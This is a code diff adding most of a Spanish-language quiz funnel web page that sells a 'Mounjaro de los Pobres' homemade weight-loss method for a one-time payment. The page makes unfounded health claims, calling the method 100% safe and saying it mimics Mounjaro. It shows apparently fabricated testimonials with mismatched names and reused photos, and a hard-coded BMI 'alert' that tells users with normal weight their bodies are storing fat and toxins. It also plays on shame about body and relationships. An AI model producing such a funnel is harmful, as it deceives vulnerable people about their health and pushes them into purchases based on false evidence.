+                </div>
+            </div>
+        </div>
+        <!-- Screen 5: Name -->
+        <div class="screen" id="screen5">
+            <div class="question-title">¿Cuál es tu nombre?</div>
+            <input class="name-input" id="nameInput" placeholder="Escribe tu nombre" type="text" />
+            <div class="privacy-text">
+                Para crear tu plan personalizado, necesitamos tu nombre. Quédate tranquila, tus datos están protegidos 🔒
+            </div>
+            <button class="continue-button" disabled="" id="nameButton" onclick="nextScreen()">Continuar</button>
+        </div>
+        <!-- Screen 6: Weight Impact -->
+        <div class="screen" id="screen6">
+            <div class="question-title"><span id="userName">Nome</span>, dime cómo tu peso <span style="color: #28a745;">impacta tu vida</span></div>
+            <div class="options-container">
+                <div class="option" onclick="selectOption(this, 'weightImpact', 'fotos')">
+                    <div class="option-content">
+                        <span class="emoji">📷</span>
+                        <span class="option-text">Evito tomar fotos porque me da vergüenza</span>
+                    </div>
+                </div>
+                <div class="option" onclick="selectOption(this, 'weightImpact', 'parceiro')">
+                    <div class="option-content">
+                        <span class="emoji">💔</span>
+                        <span class="option-text">Mi pareja ya no me mira con deseo como antes</span>
+                    </div>
+                </div>
+                <div class="option" onclick="selectOption(this, 'weightImpact', 'social')">
+                    <div class="option-content">
+                        <span class="emoji">😔</span>
+                        <span class="option-text">Evito reuniones sociales porque no me siento bien conmigo misma</span>
+                    </div>
+                </div>
+                <div class="option" onclick="selectOption(this, 'weightImpact', 'nenhuma')">
+                    <div class="option-content">
+                        <span class="emoji">👋</span>
+                        <span class="option-text">Ninguna de las opciones</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Screen 7: Happiness -->
+        <div class="screen" id="screen7">
+            <div class="question-title">¿Estás realmente <span style="color: #28a745;">feliz</span> com <span style="color: #dc3545;">con tu apariencia?</span></div>
+            <div class="options-container">
+                <div class="option" onclick="selectOption(this, 'happiness', 'nao-acima-peso')">
+                    <div class="option-content">
+                        <span class="emoji">😤</span>
+                        <span class="option-text">No, porque me siento con sobrepeso</span>
+                    </div>
+                </div>
+                <div class="option" onclick="selectOption(this, 'happiness', 'sim-melhorar-saude')">
+                    <div class="option-content">
+                        <span class="emoji">💔</span>
+                        <span class="option-text">Sí, pero sé que puedo mejorar mi salud</span>
+                    </div>
+                </div>
+                <div class="option" onclick="selectOption(this, 'happiness', 'nao-perder-peso')">
+                    <div class="option-content">
+                        <span class="emoji">😔</span>
+                        <span class="option-text">No, me gustaría bajar de peso para mejorar mi bienestar</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Screen 8: Obstacles -->
+        <div class="screen" id="screen8">
+            <div class="question-title">¿Qué es lo que más te <span style="color: #dc3545;">impide</span> de <span style="color: #dc3545;">adelgazar?</span></div>
+            <div class="options-container">
+                <div class="option" onclick="selectOption(this, 'obstacles', 'tempo')">
+                    <div class="option-content">
+                        <span class="emoji">⏰</span>
+                        <div>
+                            <div class="option-text">Falta de tiempo</div>
+                            <div class="option-description">Rutina agitada.</div>
+                        </div>
+                    </div>
+                    <span class="arrow">›</span>
+                </div>
+                <div class="option" onclick="selectOption(this, 'obstacles', 'autocontrole')">
+                    <div class="option-content">
+                        <span class="emoji">😅</span>
+                        <div>
+                            <div class="option-text">Autocontrol</div>
+                            <div class="option-description">Dificultad para resistir las tentaciones alimenticias.</div>
+                        </div>
+                    </div>
+                    <span class="arrow">›</span>
+                </div>
+                <div class="option" onclick="selectOption(this, 'obstacles', 'financeiro')">
+                    <div class="option-content">
+                        <span class="emoji">💰</span>
+                        <div>
+                            <div class="option-text">Financeiro</div>
+                            <div class="option-description">Encontrar opciones saludables más caras que los alimentos procesados.</div>
+                        </div>
+                    </div>
+                    <span class="arrow">›</span>
+                </div>
+            </div>
+        </div>
+        <!-- Screen 9: Benefits -->
+        <div class="screen" id="screen9">
+            <div class="question-title"><span style="color: #28a745;">¿Cuáles de estos beneficios</span> te gustaría tener?</div>
+            <div class="question-description">
+                👉 Vamos a personalizar tu fórmula para maximizar los resultados.
+            </div>
+            <div class="options-container">
+                <div class="checkbox-option" onclick="toggleCheckbox(this, 'emagrecer')">
+                    <div class="option-content">
+                        <span style="margin-right: 15px;">➡️</span>
+                        <span class="option-text">Adelgazar sin esfuerzo y sin efecto rebote</span>
+                    </div>
+                    <div class="checkbox"></div>
+                </div>
+                <div class="checkbox-option" onclick="toggleCheckbox(this, 'sono')">
+                    <div class="option-content">
+                        <span style="margin-right: 15px;">➡️</span>
+                        <span class="option-text">Sueño más profundo</span>
+                    </div>
+                    <div class="checkbox"></div>
+                </div>
+                <div class="checkbox-option" onclick="toggleCheckbox(this, 'energia')">
+                    <div class="option-content">
+                        <span style="margin-right: 15px;">➡️</span>
+                        <span class="option-text">Más energía y disposición durante el día</span>
+                    </div>
+                    <div class="checkbox"></div>
+                </div>
+                <div class="checkbox-option" onclick="toggleCheckbox(this, 'autoestima')">
+                    <div class="option-content">
+                        <span style="margin-right: 15px;">➡️</span>
+                        <span class="option-text">Aumento de la autoestima y la confianza</span>
+                    </div>
+                    <div class="checkbox"></div>
+                </div>
+                <div class="checkbox-option" onclick="toggleCheckbox(this, 'estresse')">
+                    <div class="option-content">
+                        <span style="margin-right: 15px;">➡️</span>
+                        <span class="option-text">Reducción del estrés y la ansiedad</span>
+                    </div>
+                    <div class="checkbox"></div>
+                </div>
+            </div>
+            <button class="continue-button" disabled="" id="benefitsButton" onclick="nextScreen()">Continuar</button>
+        </div>
+
+        <!-- Screen 10: Final -->
+        <div class="screen" id="screen10">
+            <div class="question-title">El <span style="color: #28a745;">Mounjaro de los Pobres</span> que está haciendo que miles de mujeres adelgacen <span style="color: #28a745;">¡sin gastar una fortuna en farmacia!</span></div>
+            <div class="question-description">
+                Descubre el método casero, 100% seguro y natural, que imita los efectos del Mounjaro — controlando tu hambre, acelerando el metabolismo y ayudándote a perder peso de forma rápida y definitiva. Sin inyecciones, sin gastar una fortuna y sin depender de médicos estafadores.
+            </div>
+            <div class="process-diagram" style="background: #f8f9fa; border-radius: 15px; padding: 20px; margin: 20px 0; text-align: center; color: #666; font-size: 14px;">
+                <!-- SUBSTITUA AQUI: Link da imagem do diagrama do processo -->
+                <img alt="Diagrama del Proceso" src="images/lg-ejoga-asnb.png" style="width: 100%; max-width: 300px; border-radius: 10px;" />
+            </div>
+            <div class="question-description">
+                El Mounjaro de los Pobres actúa mientras duermes, acelerando la quema de grasa a través del estímulo natural del metabolismo y del equilibrio hormonal nocturno.
+            </div>
+            <button class="continue-button" onclick="nextScreen()">Continuar</button>
+        </div>
+        <!-- Screen 11: Testimonials -->
+        <div class="screen" id="screen11">
+            <div class="testimonials-header">
+                <div class="testimonials-title">🔥 ¡Historias Reales de Transformación!</div>
+            </div>
+            <div class="testimonial-card">
+                <div class="testimonial-images">
+                    <div class="testimonial-image">
+                        <!-- SUBSTITUA AQUI: Link da imagem ANTES da Fernanda -->
+                        <img alt="Fernanda Antes" src="images/lg-zbwpj-f34071c8-68f8-4a67-a669-e4ef0fc9bedc.jpg" />
+                        <div class="image-label">ANTES</div>
+                    </div>
+                </div>
+                <div class="testimonial-profile">
+                    <div class="profile-pic">
+                        <!-- SUBSTITUA AQUI: Link da foto de perfil da Fernanda -->
+                        <img alt="Fernanda" src="images/xs-esy3q-images-5.jpg" />
+                    </div>
+                    <div class="profile-info">
+                        <h4>Martina Pérez</h4>
+                        <p>Buenos Aires - ARG</p>
+                    </div>
+                </div>
+                <div class="testimonial-text">
+                    Ya había intentado de todo para adelgazar, pero nada funcionaba. Después de incluir la fórmula del Mounjaro de los Pobres en mi rutina, perdí 11kg sin cambiar nada en mi alimentación. Ahora me siento más segura y con más energía. ¡Gracias por cambiar mi vida!
+                </div>
+            </div>
+            <div class="testimonial-card">
+                <div class="testimonial-images">
+                    <div class="testimonial-image">
+                        <!-- SUBSTITUA AQUI: Link da imagem ANTES da Karoline -->
+                        <img alt="Karoline Antes" src="images/lg-hwdf5-62ac2b18-7c54-4ddb-aaf1-d6b3c351bc69.jpg" />
+                        <div class="image-label">ANTES</div>
+                    </div>
+                </div>
+                <div class="testimonial-profile">
+                    <div class="profile-pic">
+                        <!-- SUBSTITUA AQUI: Link da foto de perfil da Karoline -->
+                        <img alt="Karoline" src="images/xs-3bzpd-images-3.jpg" />
+                    </div>
+                    <div class="profile-info">
+                        <h4>Camila Rodríguez</h4>
+                        <p>Puebla - MX</p>
+                    </div>
+                </div>
+                <div class="testimonial-text">
+                    Gente, nunca lograba adelgazar ni dejar el azúcar. Parecía imposible, pero el Mounjaro de los Pobres lo cambió todo. Ya no tengo antojo de dulces. Todo lo que intentaba no funcionaba, pero esto sí. Solo seguí el paso a paso y funcionó. ¡8kg en solo 30 días!
+                </div>
+            </div>
+            <button class="continue-button" onclick="nextScreen()">Continuar</button>
+        </div>
+        <!-- Screen 12: Current Weight -->
+        <div class="screen" id="screen12">
+            <div class="question-title">¿Cuál es tu <span style="color: #28a745;">peso actual?</span></div>
+            <div class="question-description">
+                ¡Ya casi terminamos! Vamos a ajustar tu plan de acuerdo con tu cuerpo.
+            </div>
+            <div class="slider-container">
+                <div class="unit-selector">
+                    <div class="unit-button active" onclick="switchUnit('kg', this)">kg</div>
+                    <div class="unit-button" onclick="switchUnit('lb', this)">lb</div>
+                </div>
+                <div class="value-display" id="weightValue">70<span style="font-size: 24px;">kg</span></div>
+                <div class="slider-track" id="weightSlider">
+                    <div class="slider-fill" style="width: 50%"></div>
+                    <div class="slider-thumb" onmousedown="startDrag(event, 'weight')" style="left: calc(50% - 11px)"></div>
+                </div>
+                <div class="slider-labels">
+                    <span>40</span>
+                    <span>90</span>
+                    <span>150</span>
+                </div>
+                <div class="slider-instruction">Arrastra para ajustar</div>
+                <div class="slider-note">
+                    ¡Con base en esto, ajustaremos la dosis ideal para obtener los mejores resultados!
+                </div>
+            </div>
+            <button class="continue-button" onclick="nextScreen()">Continuar</button>
+        </div>
+
+        <!-- Screen 13: Height -->
+        <div class="screen" id="screen13">
+            <div class="question-title">¿Cuál es tu <span style="color: #28a745;">estatura?</span></div>
+            <div class="question-description">
+                Esto nos ayudará a calcular la cantidad exacta del Mounjaro de los Pobres para tu cuerpo.
+            </div>
+            <div class="slider-container">
+                <div class="unit-selector">
+                    <div class="unit-button active" onclick="switchHeightUnit('cm', this)">cm</div>
+                    <div class="unit-button" onclick="switchHeightUnit('pol', this)">pol</div>
+                </div>
+                <div class="value-display" id="heightValue">170<span style="font-size: 24px;">cm</span></div>
+                <div class="slider-track" id="heightSlider">
+                    <div class="slider-fill" style="width: 50%"></div>
+                    <div class="slider-thumb" onmousedown="startDrag(event, 'height')" style="left: calc(50% - 11px)"></div>
+                </div>
+                <div class="slider-labels">
+                    <span>140</span>
+                    <span>170</span>
+                    <span>210</span>
+                </div>
+                <div class="slider-instruction">Arrastra para ajustar</div>
+            </div>
+            <button class="continue-button" onclick="nextScreen()">Continuar</button>
+        </div>
+        <!-- Screen 14: Goal Weight -->
+        <div class="screen" id="screen14">
+            <div class="question-title">¿Cuál es tu <span style="color: #28a745;">peso objetivo</span> (deseado)?</div>
+            <div class="question-description">
+                Esto nos ayudará a personalizar un plan específicamente para ti.
+            </div>
+            <div class="slider-container">
+                <div class="unit-selector">
+                    <div class="unit-button active" onclick="switchGoalUnit('kg', this)">kg</div>
+                    <div class="unit-button" onclick="switchGoalUnit('lb', this)">lb</div>
+                </div>
+                <div class="value-display" id="goalValue">60<span style="font-size: 24px;">kg</span></div>
+                <div class="slider-track" id="goalSlider">
+                    <div class="slider-fill" style="width: 50%"></div>
+                    <div class="slider-thumb" onmousedown="startDrag(event, 'goal')" style="left: calc(50% - 11px)"></div>
+                </div>
+                <div class="slider-labels">
+                    <span>35</span>
+                    <span>70</span>
+                    <span>120</span>
+                </div>
+                <div class="slider-instruction">Arrastra para ajustar</div>
+                <div class="slider-note">
+                    ¡Con base en esto, ajustaremos la dosis ideal para obtener los mejores resultados!
+                </div>
+            </div>
+            <button class="continue-button" onclick="nextScreen()">Continuar</button>
+        </div>
+        <!-- Screen 15: Water Intake -->
+        <div class="screen" id="screen15">
+            <div class="question-title">¿Cuántos vasos de <span style="color: #28a745;">agua</span> bebes al día?</div>
+            <div class="question-description">
+                Tu nivel de hidratación también influye en tu pérdida de peso.
+            </div>
+            <div class="options-container">
+                <div class="option" onclick="selectOption(this, 'water', 'cafe-cha')">
+                    <div class="option-content">
+                        <span class="emoji">☕</span>
+                        <span class="option-text">Solo bebo café o té</span>
+                    </div>
+                </div>
+                <div class="option" onclick="selectOption(this, 'water', '1-2-copos')">
+                    <div class="option-content">
+                        <span class="emoji">💧</span>
+                        <span class="option-text">1-2 vasos al día</span>
+                    </div>
+                </div>
+                <div class="option" onclick="selectOption(this, 'water', '2-6-copos')">
+                    <div class="option-content">
+                        <span class="emoji">💧</span>
+                        <span class="option-text">2-6 vasos al día</span>
+                    </div>
+                </div>
+                <div class="option" onclick="selectOption(this, 'water', 'mais-6-copos')">
+                    <div class="option-content">
+                        <span class="emoji">💧</span>
+                        <span class="option-text">Más de 6 vasos</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Screen 16: Loading 1 -->
+        <div class="screen loading-screen" id="screen16">
+            <div class="loading-title">
+                <span class="highlight">Espera</span> mientras preparamos el Mounjaro de los Pobres...
+            </div>
+            <div class="loading-progress">
+                <div class="loading-bar">
+                    <div class="loading-fill" id="loadingFill1" style="width: 0%"></div>
+                </div>
+                <div class="loading-percentage" id="loadingPercent1">0%</div>
+            </div>
+            <div class="loading-image">
+                <!-- SUBSTITUA AQUI: Link da imagem de loading 1 (antes/depois) -->
+                <img alt="Transformación Cargando 1" src="images/lg-h91ak-clipboard-image-1745844731-1.png" />
+            </div>
+        </div>
+        <!-- Screen 17: Loading 2 -->
+        <div class="screen loading-screen" id="screen17">
+            <div class="loading-title">
+                <span class="highlight">Espera</span> mientras preparamos el Mounjaro de los Pobres...
+            </div>
+            <div class="loading-progress">
+                <div class="loading-bar">
+                    <div class="loading-fill" id="loadingFill2" style="width: 0%"></div>
+                </div>
+                <div class="loading-percentage" id="loadingPercent2">0%</div>
+            </div>
+            <div class="loading-image">
+                <!-- SUBSTITUA AQUI: Link da imagem de loading 2 (transformação com -12kg) -->
+                <img alt="Transformación Cargando 2" src="images/a854eba2-81c9-4ef3-9f3c-ccd5a5f45a94.webp" />
+                <div style="position: absolute; bottom: 20px; left: 20px; background: #28a745; color: white; padding: 8px 15px; border-radius: 10px; font-weight: bold;">Día 01</div>
+                <div style="position: absolute; bottom: 20px; right: 20px; background: #28a745; color: white; padding: 8px 15px; border-radius: 10px; font-weight: bold;">Día 30</div>
+                <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #28a745; color: white; padding: 8px 15px; border-radius: 10px; font-weight: bold; font-size: 18px;">-12kg</div>
+            </div>
+        </div>
+
+        <!-- Screen 18: IMC Alert -->
+        <div class="screen alert-screen" id="screen18">
+            <div class="alert-header">
+                <div class="alert-title">
+                    <span class="alert-icon">⚠️</span> ATENCIÓN, <span id="userNameAlert">Nombre</span>! Según tus respuestas, tu cuerpo está en modo ACUMULACIÓN DE GRASA. Si no actúas HOY, esta situación tiende a EMPEORAR.
+                </div>
+                <div class="alert-subtitle">
+                    Tu IMC: 21.60
+                </div>
+            </div>
+            <div class="imc-section">
+                <div class="imc-title">Índice de Masa Corporal (IMC)</div>
+                <div class="imc-scale">
+                    <div class="imc-indicator">Bajo Peso</div>
+                    <div class="imc-indicator">Normal</div>
+                    <div class="imc-indicator">Sobrepeso</div>
+                    <div class="imc-indicator alert">Obesidad</div>
+                </div>
+                <div style="text-align: center; margin: 15px 0; font-size: 14px; color: #666;">
+                    <strong>Zona de Alerta</strong> - ¡Este es tu resultado!
+                </div>
+            </div>
+            <div style="background: #fff3cd; border-radius: 10px; padding: 15px; margin: 20px 0; border-left: 4px solid #ffc107;">
+                <p style="font-size: 14px; color: #856404; margin: 0;">
+                    <strong>⚠️ ¡Tu metabolismo puede estar saboteándote sin que lo notes!</strong>
+                </p>
+            </div>
+            <div style="font-size: 14px; line-height: 1.5; color: #333; margin: 20px 0;">
+                Incluso estando en un peso normal, tu cuerpo puede estar reteniendo toxinas más lentamente, dificultando la quema de grasa y dejándote con menos energía.
+            </div>
+            <div class="alert-list">
+                <div class="alert-item">
+                    <strong>Algunas señales de advertencia:</strong>
+                </div>
+                <div class="alert-item">
+                    <strong>❌ Metabolismo lento y dificultad para adelgazar incluso comiendo poco</strong>
+                </div>
+                <div class="alert-item">
+                    <strong>❌ Cansancio constante y sensación de hinchazón</strong>
+                </div>
+                <div class="alert-item">
+                    <strong>❌ Acumulación de grasa en áreas específicas del cuerpo, especialmente en el abdomen</strong>
+                </div>
+            </div>
+            <div style="background: #d4edda; border-radius: 10px; padding: 15px; margin: 20px 0; border-left: 4px solid #28a745;">
+                <p style="font-size: 14px; color: #155724; margin: 0;">
+                    <strong>✅ ¡Con el Mounjaro de los Pobres, tu cuerpo acelera la quema de grasa naturalmente!</strong>
+                </p>
+                <p style="font-size: 14px; color: #155724; margin: 5px 0 0 0;">
+                    <strong>✅ La combinación ideal de ingredientes puede activar tu metabolismo, reducir la retención de líquidos y aumentar tu energía.</strong>
+                </p>
+            </div>
+            <div style="background: #e8f5e8; border-radius: 10px; padding: 15px; margin: 20px 0;">
+                <p style="font-size: 14px; color: #28a745; margin: 0; font-weight: bold;">
+                    🔥 ¡Descubre ahora cómo el Mounjaro de los Pobres puede transformar tu cuerpo!
+                </p>
+            </div>
+            <div style="text-align: center; margin: 20px 0;">
+                <strong>¡Mira la transformación de Flavinha!</strong>
+            </div>
+            <div class="flavinha-image">
+                <!-- SUBSTITUA AQUI: Link da imagem da transformação da Flavinha -->
+                <img alt="Transformación de Flavinha" src="images/agatha-1-1589408489867_v2_450x450.jpg" />
+            </div>
+            <button class="continue-button" onclick="nextScreen()">Continuar</button>
+        </div>
+        <!-- Screen 19: Comparison -->
+        <div class="screen comparison-screen" id="screen19">
+            <div class="comparison-title">
+                <span id="userName2">Nombre</span>, ¿estás lista para <span style="color: #28a745;">transformar tu cuerpo</span> y tu <span style="color: #28a745;">salud?</span>
+            </div>
+            <div class="comparison-images">
+                <div class="comparison-image">
+                    <!-- SUBSTITUA AQUI: Link da imagem comparação ANTES -->
+                    <img alt="Antes del Mounjaro" src="images/lg-m5deb-saveclipapp-476120638-18063072610928910-746158896043090905-n.jpg" />
+                    <div class="comparison-label">Esta eres tú con 70 kg, antes del Mounjaro de los Pobres</div>
+                </div>
+            </div>
+            <div class="health-metrics">
+                <div class="metric-row">
+                    <div class="metric-label">Metabolismo</div>
+                    <div class="metric-bars">
+                        <div class="metric-bar before"></div>
+                        <div class="metric-bar after"></div>
+                    </div>
+                </div>
+                <div style="display: flex; justify-content: space-between; font-size: 12px; color: #666; margin-bottom: 15px;">
+                    <span>Lento</span>
+                    <span>Acelerado</span>
+                </div>
+                <div class="metric-row">
+                    <div class="metric-label">Nivel de estrés</div>
+                    <div class="metric-bars">
+                        <div class="metric-bar before"></div>
+                        <div class="metric-bar after"></div>
+                    </div>
+                </div>
+                <div style="display: flex; justify-content: space-between; font-size: 12px; color: #666; margin-bottom: 15px;">
+                    <span>Alto</span>
+                    <span>Bajo</span>
+                </div>
+                <div class="metric-row">
+                    <div class="metric-label">Nivel de energía</div>
+                    <div class="metric-bars">
+                        <div class="metric-bar before"></div>
+                        <div class="metric-bar after"></div>
+                    </div>
+                </div>
+                <div style="display: flex; justify-content: space-between; font-size: 12px; color: #666; margin-bottom: 15px;">
+                    <span>Bajo</span>
+                    <span>Alto</span>
+                </div>
+                <div class="metric-row">
+                    <div class="metric-label">Riesgo de enfermedades</div>
+                    <div class="metric-bars">
+                        <div class="metric-bar before"></div>
+                        <div class="metric-bar after"></div>
+                    </div>
+                </div>
+                <div style="display: flex; justify-content: space-between; font-size: 12px; color: #666; margin-bottom: 15px;">
+                    <span>Alto</span>
+                    <span>Bajo</span>
+                </div>
+            </div>
+            <div class="plan-section">
+                <div class="plan-title">¿Cómo funciona el Plan?</div>
+                <div class="plan-description">
+                    Con base en tu información personal y objetivos, creamos un plan 100% personalizado para que uses el Mounjaro de los Pobres. Nuestra fórmula casera está diseñada para potenciar tu pérdida de peso en 4 semanas, respetando tu estilo de vida, tus limitaciones y tu rutina. No tienes que preocuparte, te guiaremos sobre qué comer.
+                </div>
+                <div class="plan-includes">
+                    <h4>Tu plan incluye:</h4>
+                    <ul>
+                        <li><strong>Cómo usar el Mounjaro de la manera correcta:</strong> Basado en las investigaciones más recientes sobre el uso de sustancias como la Liraglutida, desarrollamos el Protocolo Mounjaro de los Pobres, la forma más eficaz y segura de usarlo para adelgazar sin perder músculo ni pasar hambre.</li>
+                        <li><strong>Definición de metas diarias:</strong> para mantenerte en el camino correcto</li>
+                        <li><strong>Hoja de seguimiento:</strong> Conoce exactamente cuánto estás avanzando.</li>
+                        <li><strong>+ 4 Bonos Exclusivos</strong></li>
+                    </ul>
+                </div>
+            </div>
+            <button class="continue-button" onclick="nextScreen()">Continuar</button>
+        </div>
+
+        <!-- Screen 20: Bonus -->
+        <div class="screen" id="screen20">
+            <div class="bonus-section">
+                <div class="bonus-title">
+                    Al Garantizar Tu Mounjaro de los Pobres Hoy, <span style="color: #28a745;">¡Recibes Todos los Bonos de Regalo!</span>
+                </div>
+                <div class="bonus-item" style="background: linear-gradient(135deg, #28a745, #20c997);">
+                    <div class="bonus-icon">🌿</div>
+                    <div class="bonus-content">
+                        <h4>Potencia la Quema de Grasa:</h4>
+                        <p>Descubre exactamente qué comer mientras usas el Mounjaro</p>
+                    </div>
+                </div>
+                <div class="bonus-item" style="background: linear-gradient(135deg, #fd7e14, #e63946);">
+                    <div class="bonus-icon">👩</div>
+                    <div class="bonus-content">
+                        <h4>Deshincha en 7 Días:</h4>
+                        <p>Aprende la forma más fácil de deshinchar y ver grandes resultados en el espejo en menos de 7 días.</p>
+                    </div>
+                </div>
+                <div class="bonus-item" style="background: linear-gradient(135deg, #6f42c1, #e83e8c);">
+                    <div class="bonus-icon">👫</div>
+                    <div class="bonus-content">
+                        <h4>Anti-Efecto Rebote:</h4>
+                        <p>Descubre cómo mantener el peso perdido y no volver a preocuparte por engordar.</p>
+                    </div>
+                </div>
+                <div class="bonus-item" style="background: linear-gradient(135deg, #dc3545, #fd7e14);">
+                    <div class="bonus-icon">⚡</div>
+                    <div class="bonus-content">
+                        <h4>Metabolismo PRO 5x:</h4>
+                        <p>Aprende las principales estrategias para acelerar tu metabolismo y quemar grasa.</p>
+                    </div>
+                </div>
+            </div>
+            <button class="continue-button" onclick="nextScreen()">Continuar</button>
+        </div>
+
+        <!-- Screen 21: Final Offer -->
+        <div class="screen" id="screen21">
+            <div class="offer-section">
+                <div class="offer-title">
+                    TODO LO QUE RECIBES HOY:
+                </div>
+
+                <div class="offer-list">
+                    <div class="offer-item">
+                        <span class="offer-check">✅</span>
+                        <div>
+                            <strong>Mounjaro de los Pobres Completo</strong><br>
+                            <small>y paso a paso de cómo usarlo.</small>
+                        </div>
+                    </div>
+
+                    <div class="offer-item">
+                        <span class="offer-check">✅</span>
+                        <div>
+                            <strong>Detox Exclusivo de 7 Días</strong>
+                        </div>
+                    </div>
+
+                    <div class="offer-item">
+                        <span class="offer-check">✅</span>
+                        <div>
+                            <strong>Soporte Exclusivo</strong><br>
+                            <small>durante el proceso del Mounjaro.</small>
+                        </div>
+                    </div>
+
+                    <div class="offer-item">
+                        <span class="offer-check">✅</span>
+                        <div>
+                            <strong>Pago Único</strong><br>
+                            <small>¡sin mensualidades!</small>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bonus-highlight">
+                    <div style="color: #28a745; font-weight: bold; margin-bottom: 10px;">✅ ¡RECIBES TODOS LOS</div>
+                    <div style="font-size: 18px; font-weight: bold; color: #333;">4 BONOS ANTERIORES HOY!</div>
+                </div>
+
+                <div class="price-section">
+                    <div class="original-price">Valor Total: $ 197</div>
+                    <div style="font-size: 20px; font-weight: bold; margin: 10px 0;">🤯 Por Solo:</div>
+                    <div class="current-price">R$ 9<span style="font-size: 24px;">,90</span></div>
+                    <div class="price-note">
+                        ¡El secreto para deshinchar, perder medidas y sentirte más hermosa en pocos días!
+                    </div>
+                </div>
+
+                <button class="cta-button" style="font-size: 18px; padding: 20px 40px; margin: 20px 0;" onclick="window.open('https://pay.hotmart.com/Q100670472X?checkoutMode=10', '_blank')">
+                    ¡Quiero Empezar Hoy! 😍
+                </button>
+
+                <div style="display: flex; justify-content: center; gap: 20px; margin: 20px 0; font-size: 12px; color: #666;">
+                    <div style="display: flex; align-items: center;">
+                        <span style="margin-right: 5px;">🛡️</span>
+                        Satisfacción Garantizada
+                    </div>
+                    <div style="display: flex; align-items: center;">
+                        <span style="margin-right: 5px;">🔒</span>
+                        Compra Segura
+                    </div>
+                    <div style="display: flex; align-items: center;">
+                        <span style="margin-right: 5px;">🔐</span>
+                        Privacidad Protegida
+                    </div>
+                </div>
+
+                <div style="text-align: center; margin: 30px 0;">
+                    <div style="font-size: 18px; font-weight: bold; color: #28a745; margin-bottom: 15px;">
+                        Quien lo usa obtiene resultados 😍 👇
+                    </div>
+
+                    <div class="result-images">
+                        <img src="images/lg-2f4od-8e3a2345-c441-4342-87dd-aa04acf732a4.jpg" alt="Resultados reales">
+                    </div>
+                </div>
+
+                <div class="guarantee-section">
+                    <div style="font-size: 48px; margin-bottom: 10px;">🏆</div>
+                    <div style="font-size: 18px; font-weight: bold; margin-bottom: 10px;">GARANTÍA DE 30 DÍAS</div>
+                    <div style="font-size: 14px; line-height: 1.5;">
+                        La compra de este material no tiene ningún riesgo para ti.<br><br>
+                        Si no cumple con tus expectativas dentro de los primeros 30 días tras la compra, te devolveremos todo tu dinero sin hacer preguntas.
+                    </div>
+                    <div style="margin-top: 15px; font-size: 14px; color: #28a745;">
+                        <strong>Solo escribe al soporte en<br>
+                            mounjaropobre@gmail.com</strong>
+                    </div>
+                </div>
+
+                <div class="testimonial-final">
+                    <div class="stars">⭐⭐⭐⭐⭐</div>
+                    <div style="font-weight: bold; margin-bottom: 5px;">Andrea Ramírez</div>
+                    <div style="font-size: 12px; color: #666; margin-bottom: 10px;">Monterrey (MX) - Comenzó el 18/02/2025</div>
+                    <div style="font-size: 14px; line-height: 1.4; margin-bottom: 15px;">
+                        ¡Estoy literalmente sin palabras! ¡Miren esto! Fueron dos meses y medio siguiendo sin errores, es increíble, no lo esperaba, ¡estoy en shock! 😱😍
+                    </div>
+                    <div style="display: flex; gap: 10px;">
+                        <div style="flex: 1; height: 150px; background: #f0f0f0; border-radius: 10px; position: relative; overflow: hidden;">
+                            <img src="images/lg-hwdf5-62ac2b18-7c54-4ddb-aaf1-d6b3c351bc69.jpg" alt="Isabela Antes" style="width: 100%; height: 100%; object-fit: cover;">
+                            <div style="position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.7); color: white; padding: 5px 10px; border-radius: 10px; font-size: 12px;">ANTES</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="testimonial-final">
+                    <div class="stars">⭐⭐⭐⭐⭐</div>
+                    <div style="font-weight: bold; margin-bottom: 5px;">Bruna Gonçalves</div>
+                    <div style="font-size: 12px; color: #666; margin-bottom: 10px;">Itajaí (SC) - Comenzó el 04/03/2025</div>
+                    <div style="font-size: 14px; line-height: 1.4; margin-bottom: 15px;">
+                        Solo yo sé cuánto sufrí intentando bajar de peso. Esto fue único, juraba que era mentira, ¡pero ahí está el resultado! Seguro que pronto bajan el precio de las inyecciones, nadie va a querer pincharse más, ¡esto es divino jajaja! 😍 👏
+                    </div>
+                    <div style="display: flex; gap: 5px;">
+                        <div style="flex: 1; height: 120px; background: #f0f0f0; border-radius: 10px; overflow: hidden;">
+                            <img src="images/lg-bd0ys-393e5dac-187b-465b-87d1-8971dfc929db.jpg" alt="Bruna 1" style="width: 100%; height: 100%; object-fit: cover;">
+                        </div>
+                    </div>
+                </div>
+
+                <div style="background: #28a745; color: white; border-radius: 15px; padding: 15px; margin: 20px 0; text-align: center;">
+                    <div style="font-size: 16px; font-weight: bold; margin-bottom: 10px;">MÁS VENDIDO</div>
+                    <div style="font-size: 18px; font-weight: bold;">Mounjaro de los Pobres</div>
+                    <div style="font-size: 16px; margin: 10px 0;">Pago Único</div>
+                    <div style="font-size: 32px; font-weight: bold;">$ 9,90</div>
+                    <div style="font-size: 14px; opacity: 0.9;">al contado</div>
+                </div>
+
+                <button class="cta-button" style="font-size: 18px; padding: 20px 40px; margin: 20px 0;" onclick="window.open('https://pay.hotmart.com/Q100670472X?checkoutMode=10', '_blank')">
+                    ¡Quiero Empezar Hoy! 😍
+                </button>
+
+                <div style="display: flex; justify-content: center; gap: 20px; margin: 20px 0; font-size: 12px; color: #666;">
+                    <div style="display: flex; align-items: center;">
+                        <span style="margin-right: 5px;">🛡️</span>
+                        Satisfacción Garantizada
+                    </div>
+                    <div style="display: flex; align-items: center;">
+                        <span style="margin-right: 5px;">🔒</span>
+                        Compra Segura
+                    </div>
+                    <div style="display: flex; align-items: center;">
+                        <span style="margin-right: 5px;">🔐</span>
+                        Privacidad Protegida
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+        <script>
+            let currentScreen = 1;
+            let totalScreens = 21;
+            let answers = {};
+            let selectedBenefits = [];
+            let currentWeight = 70;
+            let currentHeight = 170;
+            let goalWeight = 60;
+            let isDragging = false;
+            let dragType = '';
+
+            function updateProgress() {
+                const progress = (currentScreen - 1) / (totalScreens - 1) * 100;
+                document.getElementById('progressFill').style.width = progress + '%';
+            }
+
+            function nextScreen() {
+                if (currentScreen < totalScreens) {
+                    document.getElementById('screen' + currentScreen).classList.remove('active');
+                    currentScreen++;
